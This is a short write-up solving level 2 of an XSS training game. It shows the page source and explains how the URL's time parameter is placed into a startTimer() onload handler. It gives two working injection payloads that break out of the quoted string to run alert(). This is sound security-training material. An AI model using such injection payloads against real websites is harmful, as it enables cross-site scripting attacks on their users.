# **XSSGame Level 2**

![](https://i.imgur.com/mIHalyH.png)
Use default value to submit, than you'll find following script in assets:
```shell=
<html>
  <head>
    <script src="/static/js/js_frame.js"></script>
    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() {
          window.confirm("Time is up!");
          window.loading.style.display = 'none';
          window.message.innerHTML = '<a href="?">Go back</a> to the timer setup page';
        }, seconds * 1000);
      }

    </script>
  </head>
  <body style="background-color: white;">
    <center>
      <h1 style="font-family: serif">
        webtim<span style="color: teal">r</span> <span style="color: green">pro</span>
      </h1>
      <!-- Source: https://commons.wikimedia.org/wiki/File:Loading_icon.gif -->
      <img id="loading" src="/static/img/loading.gif" style="width: 50%" onload="startTimer('3');" />
      <br>
      <div id="message">Your timer will execute in 3 seconds.</div>
      
  </center>
  </body>
</html>
```

Just like xss-game level 4, we can also find out:
`<img id="loading" src="/static/img/loading.gif" style="width: 50%" onload="startTimer('3');" />`

What we append to `time=` in url will be `timer` parameter of `startTimer();`.

`3');alert('1`

![](https://i.imgur.com/Dt83CP6.png)

※Another method

`'%2Balert()%2B'`

![](https://i.imgur.com/Z2rB3bL.png)

![](https://i.imgur.com/XoInNBr.png)
